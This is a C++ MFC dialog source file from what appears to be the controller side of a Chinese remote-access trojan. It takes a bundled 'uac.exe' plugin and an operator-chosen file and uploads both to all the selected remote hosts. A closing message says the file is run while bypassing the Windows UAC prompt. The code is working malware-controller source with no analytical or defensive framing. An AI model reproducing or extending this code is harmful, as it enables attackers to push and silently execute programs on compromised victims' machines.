// UACYXDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "UACYXDlg.h"
#include "ClientView.h"
#include "PcView.h"
#include <shlwapi.h>
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CClientView* g_pTabView;
/////////////////////////////////////////////////////////////////////////////
// CUACYXDlg dialog

CUACYXDlg::CUACYXDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CUACYXDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CUACYXDlg)
	m_edit_path1 = _T("");
	//}}AFX_DATA_INIT
}

void CUACYXDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CUACYXDlg)
	DDX_Text(pDX, IDC_UAC_LUJIN, m_edit_path1);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CUACYXDlg, CDialog)
	//{{AFX_MSG_MAP(CUACYXDlg)
	ON_BN_CLICKED(IDC_UAC_XUANZE, OnButtonPaths)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CUACYXDlg message handlers
void CUACYXDlg::OnButtonPaths() 
{
	// TODO: Add your control notification handler code here
	CFileDialog dlg(FALSE, NULL,NULL, OFN_HIDEREADONLY, "All Files (*.*)|*.*||", this);
	if(dlg.DoModal () != IDOK)
		return;	
	SetDlgItemText(IDC_UAC_LUJIN,dlg.GetPathName());
}

BOOL CUACYXDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	OnButtonPaths();

	UAC();
	return TRUE;  // return TRUE  unless you set the focus to a control
}


void CUACYXDlg::UAC()
{
	char path[MAX_PATH];
	GetModuleFileName(NULL, path, MAX_PATH);
	PathRemoveFileSpec(path);
	strcat(path,"\\Plugins\\uac.exe");
	CString uad(path);

	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	int nItems = pView->m_pListCtrl->GetItemCount();

	FILE *file=fopen(uad,"rb");
	if (file == NULL)   
	{   
		AfxMessageBox("UAC文件读取失败！");  
		return;  
	}
	
	// 读取文件
	unsigned char *data = NULL;   
	size_t size;   
	fseek(file, 0, SEEK_END);   
	size = ftell(file);   
	data = (unsigned char *)malloc(size);   
	fseek(file, 0, SEEK_SET);   
	fread(data, 1, size, file);
	fclose(file);
	
	int nPos = uad.ReverseFind('\\');
	uad = uad.Right(uad.GetLength() - nPos -1);
	
	LOCALUP LocaUp;
	ZeroMemory(&LocaUp,sizeof(LOCALUP));
	
	LocaUp.bToken = COMMAND_LOCAL_UPLOAD2;
	lstrcpy(LocaUp.lpFileName,uad.GetBuffer(0));
	
	int	nPacketLength = sizeof(LOCALUP) + size;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	
	memcpy(lpPacket,&LocaUp,sizeof(LOCALUP));
	memcpy(lpPacket + sizeof(LOCALUP),data,size);
	
    pView->SendSelectCommand(lpPacket,nPacketLength);
	
	if (data)
		free(data);
	
	if(lpPacket)
		delete[] lpPacket;
}
void CUACYXDlg::OnOK() 
{
	// TODO: Add extra validation here
	UpdateData(TRUE);
	if (m_edit_path1=="")
	{
		AfxMessageBox("请选择要上传的文件");
		return;
	}
	
	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	int nItems = pView->m_pListCtrl->GetItemCount();
	if ( nItems == 0)
	{
		AfxMessageBox( "没有选择主机" );
		return;
	}
	
	FILE *file=fopen(m_edit_path1,"rb");
	if (file == NULL)   
	{   
		AfxMessageBox("文件读取失败！");  
		return;  
	}
	
	// 读取文件
	unsigned char *data = NULL;   
	size_t size;   
	fseek(file, 0, SEEK_END);   
	size = ftell(file);   
	data = (unsigned char *)malloc(size);   
	fseek(file, 0, SEEK_SET);   
	fread(data, 1, size, file);
	fclose(file);
	
	int nPos = m_edit_path1.ReverseFind('\\');
	m_edit_path1 = m_edit_path1.Right(m_edit_path1.GetLength() - nPos -1);
	
	LOCALUP LocaUp;
	ZeroMemory(&LocaUp,sizeof(LOCALUP));
	
	LocaUp.bToken = COMMAND_LOCAL_UPLOAD1;
	lstrcpy(LocaUp.lpFileName,m_edit_path1.GetBuffer(0));
	
	int	nPacketLength = sizeof(LOCALUP) + size;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	
	memcpy(lpPacket,&LocaUp,sizeof(LOCALUP));
	memcpy(lpPacket + sizeof(LOCALUP),data,size);
	
    pView->SendSelectCommand(lpPacket,nPacketLength);

	if (data)
		free(data);
	
	if(lpPacket)
		delete[] lpPacket;
	
	AfxMessageBox("过UAC提示运行，个别电脑不支持！,测试版本!");

	CDialog::OnOK();
}

